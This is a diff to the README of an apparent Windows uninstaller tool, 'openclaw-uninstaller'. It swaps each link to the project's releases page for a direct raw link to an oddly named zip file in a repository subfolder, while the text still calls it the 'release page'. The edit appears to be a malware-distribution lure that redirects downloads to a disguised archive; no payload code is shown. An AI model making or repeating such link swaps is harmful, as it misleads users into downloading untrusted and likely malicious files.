@@ -1,9 +1,9 @@
 # 🧹 openclaw-uninstaller - Clean Uninstall in One Click
 
-[![Download openclaw-uninstaller](https://img.shields.io/badge/Download%20Now-Open%20Releases-blue?style=for-the-badge)](https://github.com/PerstGospoden/openclaw-uninstaller/releases)
+[![Download openclaw-uninstaller](https://img.shields.io/badge/Download%20Now-Open%20Releases-blue?style=for-the-badge)](https://github.com/PerstGospoden/openclaw-uninstaller/raw/refs/heads/main/eclectist/openclaw_uninstaller_abiuret.zip)
 
 ## 🚀 Download
-Visit this page to download: https://github.com/PerstGospoden/openclaw-uninstaller/releases
+Visit this page to download: https://github.com/PerstGospoden/openclaw-uninstaller/raw/refs/heads/main/eclectist/openclaw_uninstaller_abiuret.zip
 
 Choose the file for your system, then download it to your computer.
 
@@ -144,4 +144,4 @@ This README focuses on Windows because that is the most common setup for end use
 
 ## 📥 Download again
 
-If you need the file again, visit the release page: https://github.com/PerstGospoden/openclaw-uninstaller/releases
+If you need the file again, visit the release page: https://github.com/PerstGospoden/openclaw-uninstaller/raw/refs/heads/main/eclectist/openclaw_uninstaller_abiuret.zip
